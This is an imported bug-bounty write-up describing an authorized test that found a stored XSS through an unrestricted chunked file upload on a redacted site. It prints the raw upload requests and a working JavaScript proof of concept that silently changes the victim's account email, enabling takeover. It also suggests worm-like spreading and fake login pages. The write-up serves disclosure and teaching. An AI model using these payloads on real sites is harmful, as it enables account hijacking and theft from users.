---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-06-18_account-takeover-via-stored-xss-with-arbitrary-file-upload.md
original_filename: 2021-06-18_account-takeover-via-stored-xss-with-arbitrary-file-upload.md
title: Account takeover via stored XSS with arbitrary file upload
category: documents
detected_topics:
- xss
- path-traversal
- command-injection
- file-upload
tags:
- imported
- documents
- xss
- path-traversal
- command-injection
- file-upload
language: en
raw_sha256: f6b51983e522b55d27b95ee8c7d6cb393a7db9f80675d4df7c4c2c2123e171b8
text_sha256: 3bd98eddeb2b0b1ea5a464e1276ac7e66d695b2b19af721c7c16cfe886897b2b
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: false
---

# Account takeover via stored XSS with arbitrary file upload

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-06-18_account-takeover-via-stored-xss-with-arbitrary-file-upload.md
- Source Type: markdown
- Detected Topics: xss, path-traversal, command-injection, file-upload
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: False
- Raw SHA256: `f6b51983e522b55d27b95ee8c7d6cb393a7db9f80675d4df7c4c2c2123e171b8`
- Text SHA256: `3bd98eddeb2b0b1ea5a464e1276ac7e66d695b2b19af721c7c16cfe886897b2b`


## Content

---
title: "Account takeover via stored XSS with arbitrary file upload"
url: "https://0xbadb00da.medium.com/account-takeover-via-stored-xss-with-arbitrary-file-upload-2774ec6cff51"
authors: ["0xbadb00da (@0xbadb00da)"]
bugs: ["Insecure file upload", "XSS", "Account takeover"]
publication_date: "2021-06-18"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3562
scraped_via: "browseros"
---

# Account takeover via stored XSS with arbitrary file upload

Account takeover via stored XSS with arbitrary file upload
0xbadb00da
Follow
5 min read
·
Jun 18, 2021

334

1

All the actions described in the article were performed with the permission of the site owner as the part of vulnerability tests.
Requests text was modified with respect to the test subject privacy.

Prehistory

Some time ago I found a suspicious behavior on the file upload to the site. Spoiler: I was not able to exploit it itself but it helped me to focus on this part and spice my findings a bit.

Request:

POST /loadphoto/save HTTP/1.1
Host: [redacted].com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------35677109542062294861829015033
Content-Length: 131624
Connection: close

-----------------------------35677109542062294861829015033
Content-Disposition: form-data; name="qqparentuuid"

4d28538e-7fea-413f-bd70-ad18d53061fc
-----------------------------35677109542062294861829015033
Content-Disposition: form-data; name="qqparentsize"

106725
-----------------------------35677109542062294861829015033
Content-Disposition: form-data; name="qquuid"

f7a84d5c-9351-456f-b828-480213b357ca
-----------------------------35677109542062294861829015033
Content-Disposition: form-data; name="qqfilename"

photo.png
-----------------------------35677109542062294861829015033
Content-Disposition: form-data; name="qqtotalfilesize"

130708
-----------------------------35677109542062294861829015033
Content-Disposition: form-data; name="qqfile"; filename="blob"
Content-Type: image/jpeg

<image file data>
-----------------------------35677109542062294861829015033

Lead to creating a temp file on [redacted].com/tmp/f7a84d5c-9351–456f-b828–480213b357ca/607_626_1623277029_1410.jpg

I was able to change the folder name of the temporary file uploaded to the server, the first things I’ve tried were path traversal and XSS via the folder name. The second one worked but the only place where someone was able to see it was my own user’s DM before sending, so I’ve just abandoned this idea.

Utilizing an arbitrary file upload failed at this point due all temporary files were always saved with the hash name and .jpg extension.

Finding the XSS and arbitrary file upload

Meanwhile, I’ve already spent a few days returning to this again and again and that start to drive me nuts so I finally (no idea why I’ve didn’t done that previously) decide to check what can I find about this uploader online and found the server-side example.

Press enter or click to view image in full size

Well.. at least it’s supposed to be here.

Screw it, let’s check if someone forked it or just used it as an example, anyway I have no guarantee that the site uses this specific server code, at least I will get the general idea and devs like to reuse the code :)

Press enter or click to view image in full size
Hey! Look what I’ve found here

This specific file got my attention, there was a chunk file upload described, which I haven’t tried yet on the site. And what’s really matters (attention to the 3rd mark) it seems that it will upload a chunk without any extension, how the server will handle it if I’ll try to access it directly? Will I be able to do it? So many questions, let’s just check them out.

POST /loadphoto/save HTTP/1.1
Host: [redacted].com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------314488351313912217284057641047
Content-Length: 1156
Connection: close

-----------------------------314488351313912217284057641047
Content-Disposition: form-data; name="qqparentuuid"

803a50ab-d6c6-4823-89ef-95f8abae61a9
-----------------------------314488351313912217284057641047
Content-Disposition: form-data; name="qqtotalparts"

2
-----------------------------314488351313912217284057641047
Content-Disposition: form-data; name="qqpartindex"

1
-----------------------------314488351313912217284057641047
Content-Disposition: form-data; name="qqparentsize"

38775
-----------------------------314488351313912217284057641047
Content-Disposition: form-data; name="qquuid"

takeover_test1
-----------------------------314488351313912217284057641047
Content-Disposition: form-data; name="qqfilename"

1 (lage).PNG
-----------------------------314488351313912217284057641047
Content-Disposition: form-data; name="qqtotalfilesize"

39907
-----------------------------314488351313912217284057641047
Content-Disposition: form-data; name="qqfile"; filename="blob"
Content-Type: text/plain

<html><script>
alert("wow")
</script></html>
-----------------------------314488351313912217284057641047--

Trying to open it in the browser..

BOOM!

It worked! I’ve tried to inject some PHP code as well (some servers will handle the extension-less files as the php scripts sometimes) but it failed.

Get 0xbadb00da’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Never mind, let’s stick with what we have, that’s really a good start already.

What do you think about creating the link [redacted].com/tmp/secret/1?
Or maybe we want to include some of our victim data in this path to make it even more tempting? Sounds neat.
We can create a fake auth page requesting the creds or do something else, but let’s finish with the account takeover.

Account takeover

Here is how the profile update looks like:

POST /person HTTP/1.1
Host: [redacted].com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 265
Connection: close

Form%5Bname%5D=Jhon&Form%5Bage%5D=100&Form%5Babout%5D=Awesome%20guy

Basically, we can change everything we see on the screen except for one parameter — email. Can we change it via custom request?

POST /person HTTP/1.1
Host: [redacted].com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Connection: close

Form%5Bemail%5D=smthstrange@here.ru
BOOM! [2]

Seems we don’t need to even fake the auth form :) Let’s craft the final POC request and check it.

Here is uploaded file internals:

<html><script>
var xhttp = new XMLHttpRequest();
xhttp.open("POST", "/person", true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("Form[email]=testmail@gmail.com");
alert("email changed")
</script></html>

Opening the page

Let’s check our profile now

The only thing we have left to do after the victim will visit the link is to reset the password to the mail we’ve changed.

The payload can be improved to send the link to all the contacts the victim has so it will become worm-like, with our own email server we can also generate random email addresses on our domain and notify us as soon as anyone’s email was changed successfully.

Keep your chunks safe and thank you for reading!
